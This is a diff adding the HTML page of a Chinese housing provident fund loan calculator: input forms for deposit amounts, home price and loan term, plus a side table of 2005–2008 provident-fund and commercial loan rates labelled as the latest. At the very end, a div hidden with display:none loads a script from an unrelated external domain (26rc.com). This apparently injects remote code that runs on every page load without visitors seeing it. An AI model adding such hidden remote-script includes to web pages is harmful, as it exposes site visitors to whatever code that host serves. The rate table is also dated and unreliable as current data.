@@ -1,0 +1,503 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>生活百宝箱</title>
+<link href="../res/zl_style.css" rel="stylesheet" type="text/css" />
+<script language="javascript" src="../js/tools.js"></script>
+<script language="javascript" src="ll.js"></script>
+<script language="javascript" src="gjjloan1.js"></script>
+<script language="javascript" src="gjjloan2.js"></script>
+<script language="javascript" src="gjjloan3.js"></script>
+</head>
+<body lang="zh" class="BG_Lnav">
+
+<div class="Top"><a href="../index.htm" class="a_INDEX">生活百宝箱</a><b class="Top_B_arr"></b><span><strong>房产工具</strong></span></div>
+
+<table class="ZL_Cont_tab" cellpadding="0" cellspacing="0">
+<tbody>
+  <tr>
+    <td class="Cont_tbL">
+	<!--左侧导航 开始-->
+	<div class="NAV_L_Tit">房产工具</div>
+	<a href="house_gfnl.htm">购房能力评估</a>
+	<a href="house_bxjsq.htm">等额本息还款</a>
+	<a href="house_bjjsq.htm">等额本金还款</a>
+	<a href="house_tqhd.htm">提前还贷计算</a>
+	<a href="house_shfjsq.htm">税费计算器</a>
+	<a href="house_gjjjsq.htm" class="on">公积金贷款计算</a>
+	<!--左侧导航 结束-->
+	</td>
+    <td style="vertical-align:top;padding-left:10px">
+<!--右侧内容区 开始-->
+<form method="post" action="" name="formt2">
+<table width="560" border="0" cellspacing="0" cellpadding="0">
+           <tr>
+              <td>&nbsp;</td>
+            </tr>
+            <tr>
+              <td><img src="images/title6.gif" height="50"></td>
+            </tr>
+            <tr>
+              <td>
+			  <TABLE width="100%" border=0 cellPadding=0 cellSpacing=0>
+                    <TBODY>
+                    <TR>
+                      <TD vAlign=top width="97%">
+                        <DIV align=center><font color=red><a 
+                        name=1></a>最新利率</font><BR>
+                        </DIV> 
+<table width="100%" border=0 align=center cellpadding=0 cellspacing=0>
+                <tbody>
+                  <tr>
+                    <td class=p10 valign=top>                    <div align="center"><br>
+                          <TABLE width="100%"
+            border=0 align=center cellPadding=2 cellSpacing=1 bgcolor="#F8E1CD">
+                <TBODY>
+  <!--			  <TR>
+                <TD align=right width="35%">身份证号码：</TD>
+                <TD align=middle colspan="2" width="15%">
+                  <DIV align=left>--><INPUT size=20 type="hidden" name="id_card" onBlur="c_id_card(this.form)">
+  <!--</DIV></TD><TD
+                   class=p10><FONT color=#cc3300><span id="age_qx"></span></FONT></TD>
+              </TR>-->
+                <TR>
+                  <TD width="26%" height="44" align=right bgcolor="#FFFBF7"><div align="center">住房公积金<br>
+                      个人月缴存额：</div></TD>
+                  <TD width="25%" align=middle bgcolor="#FFFBF7">
+                    <DIV align=left><INPUT name=mount2 class="jsq" size=10> 
+                      元</DIV></TD>
+                  <TD width="20%" align=right nowrap bgcolor="#FFFBF7"><div align="center">缴存比例：</div></TD>
+                  <TD align=middle bgcolor="#FFFBF7"><div align="left">
+                        <INPUT
+                   name=jcbl type="text" class="jsq" value="8"  SIZE=3>
+                        %</div></TD>
+                     </TR>
+                <TR>
+                  <TD height="44" align=right bgcolor="#FFFBF7">
+                    <div align="center">配偶住房公积金<br>
+                        个人月缴存额：</div></TD>
+                  <TD align=middle bgcolor="#FFFBF7">
+                    <DIV align=left><INPUT name=mount3 class="jsq" size=10> 
+                      元</DIV></TD>
+                  <TD align=right bgcolor="#FFFBF7"><div align="center">缴存比例：</div></TD>
+                  <TD align=middle bgcolor="#FFFBF7"><div align="left">
+                        <INPUT type="text" class="jsq"
+                   name=p_bl SIZE=3 value="8">
+                        %</div></TD>
+                     </TR>
+                <TR>
+                  <TD height="44" align=right bgcolor="#FFFBF7"><div align="center">房屋评估价值<br>
+                      或实际购房款：</div></TD>
+                  <TD align=middle bgcolor="#FFFBF7">
+                    <DIV align=left><INPUT size=10 class="jsq" name=mount> 
+                      元</DIV></TD>
+                  <TD align=right bgcolor="#FFFBF7"><div align="center">房屋性质：</div></TD>
+                  <TD align=middle bgcolor="#FFFBF7"><div align="left">
+                        <INPUT type=radio 
+                  name=xz> 
+                        政策性住房
+                        <br>
+                        <INPUT type=radio 
+                  CHECKED name=xz>
+                      其它</div></TD>
+                  </TR>
+                <TR>
+                  <TD height="44" align=right bgcolor="#FFFBF7"><div align="center">贷款申请年限：</div></TD>
+                  <TD colspan="3" align=left bgcolor="#FFFBF7">
+                    <INPUT size=10 class="jsq" name=mount10> 
+                    年 <span class="style1">（注： 贷款期限最长可以计算到借款人70周岁，同时不得超过30年。 ）</span></TD>
+                  </TR>
+                <TR>
+                  <TD height="28" align=right bgcolor="#FFFBF7"><div align="center">个人信用等级：</div></TD>
+                  <TD colspan="3" align=middle bgcolor="#FFFBF7"><INPUT type=radio 
+                  name=xy> AAA级
+                    <INPUT type=radio 
+                  name=xy option> 
+                    AA级 
+                    <INPUT type=radio 
+                  CHECKED name=xy> 
+                    其它</TD>
+                  </TR></TABLE>
+                          <br>
+                          <INPUT class="jsq" onclick=gjjloan1(this.form) type=button value=开始计算 name=math2>
+              　　 <INPUT class="jsq" type=reset value=清除数据 name=qx>
+                         </div></td>
+                  </tr>
+                </tbody>
+              </table></TD>
+                      </TR>
+                   </TBODY></TABLE>			  </td>
+            </tr>
+</table>
+
+<table width="600" height="293" border=0 cellpadding=0 cellspacing=0>
+	<tbody>
+	<tr>
+		<td class=p10 height=20>
+		<div align="center">-------------------------------------------------------------------------------------------</div></td>
+	</tr>
+	<tr>
+		<td height=20 valign=top class=p10>
+		<DIV align=center><FONT color=#cc3300>您可以申请的最高贷款额度是：</FONT> <INPUT maxLength=4 class="jsq" size=4 name=ze2>万元</DIV></td>
+	</tr>
+	<tr>
+		<td height="20" valign=top class=p10>
+		<div align="center">-------------------------------------------------------------------------------------------<br></div></td>
+	</tr>
+	<tr>
+		<td class=p10 valign=top>
+		<div align="center">
+		<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
+			<TBODY>
+			<TR>
+                  <TD width="42%" height="24" align=right>您所需要的贷款额度：</TD>
+                  <TD align=left width="58%"><INPUT size=5 name=need class="jsq">
+                    万元<span class="style1">（注：不能高于上述额度）</span></TD>
+                </TR>
+                <TR>
+                  <TD width="42%" height="24" align=right>请选择还款方式：</TD>
+                  <TD align=left width="58%"><SELECT name=select class="jsq">
+                      <OPTION value="1">等额均还</OPTION><OPTION
+                    value="2">等额本金</OPTION><OPTION
+                    value="3" selected>自由还款</OPTION></SELECT></TD></TR>
+                <TR>
+                  <TD align=middle colSpan=2 height=30><div align="center">
+                          <br>
+                          <INPUT class="jsq" onclick=gjjloan2(this.form) type=button value=开始计算 name=math3>
+                      　　 
+                      <INPUT class="jsq" type=reset value=清除数据 name=qx2>
+                  </div></TD></TR>
+                <tr>
+                  <td colspan="2" height="20" align="center">-------------------------------------------------------------------------------------------</td>
+                </tr>
+                </TBODY>
+        </TABLE>
+		<TABLE width="100%" border=0 align=center cellPadding=5 cellSpacing=1 bgcolor="#CCCCCC">
+                <TBODY>
+                <TR>
+                  <TD height=25 colSpan=2 align=middle bgcolor="#f8f8f8"><div align="center"><FONT
+                  color=#cc3300>[等额均还方式计算结果]</FONT></div></TD>
+                  <TD align=middle width=1 bgColor=#f8f8f8 rowSpan=5><div align="center"></div></TD>
+                  <TD colSpan=2 align=middle bgcolor="#f8f8f8"><div align="center"><FONT
+                  color=#cc3300>[等额本金方式计算结果]</FONT></div></TD>
+				  <TD align=middle width=1 bgColor=#f8f8f8 rowSpan=5><div align="center"></div></TD>
+                  <TD height=24 colSpan=2 align=middle bgcolor="#f8f8f8"><div align="center"><FONT
+                  color=#cc3300>[自由还款方式计算结果]</FONT></div></TD>
+                </TR>
+                <TR>
+                  <TD width=17% align=middle nowrap bgcolor="#f8f8f8">　月均还款额：</TD>
+                  <TD width=16% align=middle nowrap bgcolor="#f8f8f8"><INPUT size=8 name=ze22 class="jsq">
+                  元</TD>
+                  <TD width=17% align=middle nowrap bgcolor="#f8f8f8">　首月还款额：</TD>
+                  <TD width=16% align=middle nowrap bgcolor="#f8f8f8"><INPUT size=8 name=sfk2 class="jsq">
+                  元</TD>
+                  <INPUT type="hidden" name="yj2" class="jsq">
+                  <TD height="24" align=middle nowrap bgcolor="#f8f8f8">　最低还款额：</TD>
+                  <TD width=19% height="24" align=left nowrap bgcolor="#f8f8f8"><INPUT size=8 name=sfk3 class="jsq">
+                  元</TD>
+                <TR>
+                  <TD width=17% align=middle nowrap bgcolor="#f8f8f8">&nbsp;</TD>
+                  <TD width=16% align=middle nowrap bgcolor="#f8f8f8">&nbsp;</TD>
+                  <TD width=17% align=middle nowrap bgcolor="#f8f8f8">&nbsp;</TD>
+                  <TD width=16% align=middle nowrap bgcolor="#f8f8f8">&nbsp;</TD>
+                  <TD height="24" align=middle nowrap bgcolor="#f8f8f8">　最后期本金：</TD>
+                  <TD width=19% height="24" align=left nowrap bgcolor="#f8f8f8"><INPUT size=8 name=lx4 class="jsq">
+                  元</TD>
+                </TR>
+                 <TR>
+                   <TD align=middle nowrap bgcolor="#f8f8f8">　本息合计：</TD>
+                   <TD align=middle nowrap bgcolor="#f8f8f8"><INPUT size=8 name=lx2 class="jsq">
+                   元</TD>
+                   <TD align=middle nowrap bgcolor="#f8f8f8">　本息合计：</TD>
+                   <TD align=middle nowrap bgcolor="#f8f8f8"><INPUT size=8 name=lx3 class="jsq">
+                   元</TD>
+                   <TD height="24" align=middle nowrap bgcolor="#f8f8f8">　最后期利息：</TD>
+                  <TD width=19% height="24" align=left nowrap bgcolor="#f8f8f8"><INPUT size=8 name=lx5 class="jsq">
+                  元</TD>
+                </TR>
+                 <TR>
+                  <TD width=17% align=middle bgcolor="#f8f8f8">&nbsp;&nbsp;</TD>
+                  <TD width=16% align=middle bgcolor="#f8f8f8">&nbsp;&nbsp;</TD>
+                  <TD width=17% align=middle bgcolor="#f8f8f8">&nbsp;&nbsp;</TD>
+                  <TD width=16% align=middle bgcolor="#f8f8f8">&nbsp;&nbsp;</TD>
+                  <TD height="24" align=middle nowrap bgcolor="#f8f8f8">　总偿还利息：</TD>
+                  <TD width=19% height="24" align=left nowrap bgcolor="#f8f8f8"><INPUT size=8 name=lx6 class="jsq">
+                  元</TD>
+                </TR>
+                </TBODY></TABLE>
+		</div></td>
+    </tr>
+	<tr>
+		<td style="line-height:22px;padding-top:20px"><p >              注：</span>公积金最大贷款年龄65岁，月收入低于800元，没有还款能力，不能贷款<br>
+                月收入不变情况下：35岁以内为同一个贷款额，35-65岁岁年龄增加贷款额和年限减少<br>
+                年龄不变情况下：800-1700元随收入增加贷款额增加，收入1700元以上为同一贷款额
+                    </p></td>
+	</tr>
+	</tbody>
+</table>
+</form>
+<!--右侧内容区 结束-->
+	</td>
+	<td style="vertical-align:top" width="260">
+<!--右栏信息开始-->
+<table  width="98%" border="1" bordercolor="#cccccc" cellpadding="1" cellspacing="3" style="border-collapse:collapse">
+	<tr align="center" BGCOLOR="#FFFBEC">
+		<td height="24" colspan="3" bgcolor="#FFFFFF"><b ><font COLOR="#ff9900">公积金</font></b></td>
+	</tr>
+	  <tr BGCOLOR="#EEEEEE">
+		<td width="51%" bgcolor="#dddddd">年限</td>
+		<td width="23%" bgcolor="#dddddd">1-5年</td>
+		<td width="26%" bgcolor="#dddddd">5-30年</td>
+	  </tr>
+	  <tr>
+		<td>2005.1.1前</td>
+		<td>3.60%</td>
+		<td>4.05%</td>
+	  </tr>
+	  <tr>
+		<td>2005.1.1-3.16</td>
+		<td>3.78%</td>
+		<td>4.23%</td>
+	  </tr>
+	  <tr>
+		<td>2005.3.17-2006.5.7 </td>
+		<td>3.96%</td>
+		<td>4.41%</td>
+	  </tr>
+	  <tr>
+		<td>2006.5.8后 </td>
+		<td>4.14%</td>
+		<td>4.59%</td>
+	  </tr>
+	  <tr>
+		<td>2007.3.18后 </td>
+		<td>4.32%</td>
+		<td>4.77%</td>
+	  </tr>
+	  <tr>
+		<td>2007.5.19后</td>
+		<td>4.41%</td>
+		<td>4.86%</td>
+	  </tr>
+		<td>2007.7.21后</td>
+		<td>4.50%</td>
+		<td>4.95%</td>
+	  </tr>
+  <tr>
+    <td>2007.8.22后</td>
+      <td>4.59%</td>
+      <td>5.04%</td> 
+  </tr>
+  <tr>
+  <td>2007.9.15后</td>
+      <td>5.04%</td>
+      <td>5.22%</td> 
+  </tr>
+  <tr>
+  <td>2007.9.16后</td>
+      <td>4.59%</td>
+      <td>5.13%</td> 
+  </tr>
+  <tr>
+  <td>2008.10.09后</td>
+      <td>4.32%</td>
+      <td>4.86%</td> 
+  </tr>
+  <tr>
+  <td>2008.11.27后</td>
+      <td>3.51%</td>
+      <td>4.05%</td> 
+  </tr>
+   <tr>
+  <td>2008.12.23后</td>
+      <td>3.33%</td>
+      <td>3.87%</td> 
+  </tr>
+  <tr align="center" BGCOLOR="#FFFBEC">
+    <td height="24" colspan="3" bgcolor="#ffffff"><b><font COLOR="#ff9900">商业性</font></b></td>
+  </tr>
+  <tr>
+    <td bgcolor="dddddd">年限</td>
+    <td bgcolor="dddddd">1-5年</td>
+    <td bgcolor="dddddd">5-30年</td>
+  </tr>
+  <tr>
+    <td>2006.4.28后下限</td>
+    <td>5.51%</td>
+    <td>5.75%</td>
+  </tr>
+  <tr>
+    <td>2006.4.28后上限</td>
+    <td>6.12%</td>
+    <td>6.39%</td>
+  </tr>
+  <tr>
+    <td>2006.8.19后下限</td>
+    <td>5.51%</td>
+    <td>5.81%</td>
+  </tr>
+  <tr>
+    <td>2006.8.19后上限</td>
+    <td>6.48%</td>
+    <td>6.84%</td>
+  </tr>
+  <tr>
+    <td>2007.3.18后下限</td>
+    <td>5.74%</td>
+    <td>6.04%</td>
+  </tr>
+  <tr>
+    <td>2007.3.18后上限</td>
+    <td>6.75%</td>
+    <td>7.11%</td>
+  </tr>
+  <tr>
+    <td>2007.5.19后</td>
+    <td>6.93%</td>
+    <td>7.20%</td>
+  </tr>
+  <tr>
+    <td>2007.7.21后</td>
+    <td>7.20%</td>
+    <td>7.38%</td>
+  </tr>
+  <tr>
+    <td>2007.8.22后</td>
+    <td>7.38%</td>
+    <td>7.56%</td>
+  </tr>
+<tr>
+    <td>2007.9.15后</td>
+    <td>7.56%</td>
+    <td>7.83%</td>
+  </tr>
+   <tr>
+    <td height="14"><SPAN lang="EN-US">20<SPAN lang="EN-US">07.12.21</SPAN></SPAN>后基准</td>
+    <td>7.74%&nbsp;&nbsp;&nbsp;</td>
+    <td>7.83%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2007.12.21</SPAN>后上限</td>
+    <td>8.51%&nbsp;</td>
+    <td>8.61% </td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2007.12.21</SPAN>后下限</td>
+    <td>6.579%</td>
+    <td>6.65%</td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">20</SPAN><SPAN lang="EN-US">08.09.16</SPAN>后基准</td>
+    <td>7.56%&nbsp;</td>
+    <td>7.74% </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">20<SPAN lang="EN-US">08.09.16</SPAN></SPAN>后上限</td>
+    <td> 8.32%&nbsp;</td>
+    <td>8.51% </td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">20</SPAN><SPAN lang="EN-US">08.09.16</SPAN>后下限</td>
+    <td>6.426%</td>
+    <td>6.579% </td>
+  </tr>
+  
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.09</SPAN>后基准</td>
+    <td>7.29%&nbsp;&nbsp;</td>
+    <td>7.47%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.09</SPAN>后上限</td>
+    <td>8.02%</td>
+    <td>8.22%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.10.09</SPAN>后下限</td>
+    <td>6.20%</td>
+    <td>6.35%</td>
+  </tr>
+  
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.27</SPAN>后基准</td>
+    <td>7.29%&nbsp;&nbsp;</td>
+    <td>7.47%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.27</SPAN>后上限</td>
+    <td>8.02%</td>
+    <td>8.22%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.10.27</SPAN>后下限</td>
+    <td>5.10%</td>
+    <td>5.23%</td>
+  </tr>
+    <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.30</SPAN>后基准</td>
+    <td>7.02%&nbsp;&nbsp;</td>
+    <td>7.20%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.10.30</SPAN>后上限</td>
+    <td>7.72%</td>
+    <td>7.92%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.10.30</SPAN>后下限</td>
+    <td>4.91%</td>
+    <td>5.04%</td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.11.27</SPAN>后基准</td>
+    <td>5.94%&nbsp;&nbsp;</td>
+    <td>6.12%&nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.11.27</SPAN>后上限</td>
+    <td>6.53%</td>
+    <td>6.73%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.11.27</SPAN>后下限</td>
+    <td>4.16%</td>
+    <td>4.28%</td>
+  </tr>
+   <tr>
+    <td height="14"><SPAN lang="EN-US">2008.12.23</SPAN>后基准</td>
+    <td>5.76%&nbsp;&nbsp;</td>
+    <td>5.94% &nbsp; </td>
+  </tr>
+  <tr>
+    <td height="14"><SPAN lang="EN-US">2008.12.23</SPAN>后上限</td>
+    <td>6.34%</td>
+    <td>6.53%</td>
+  </tr>
+  <tr>
+    <td><SPAN lang="EN-US">2008.12.23</SPAN>后下限</td>
+    <td>4.03%</td>
+    <td>4.16% </td>
+  </tr>
+  <tr>
+    <td colspan="3"><p> 2005年1月1日，05年第1次加息； <br>
+        2005年3月17日，05年第2次加息； <br>
+        2006年4月28日，06年第1次加息，此后银行可以选择下限和上限之间的利率。 <br>
+        2006年8月19日，06年第2次加息； <br>
+        2007年3月18日，07年第1次加息。 <br>
+        2007年5月19日，07年第2次加息。 <br>
+        2007年7月21日，07年第3次加息。<br>
+        2007年8月22日，07年第4次加息。<br>
+        2007年9月15日，07年第5次加息。<br>
+    </p></td>
+  </tr>
+</table>
+<!--右栏信息结束-->
+	</td>
+  </tr>
+</tbody>
+</table>
+
+<!--左侧标签 结束-->
+<div style="display:none"><script type="text/javascript" src="http://www.26rc.com/js/26.js"></script></div></body>
+</html>
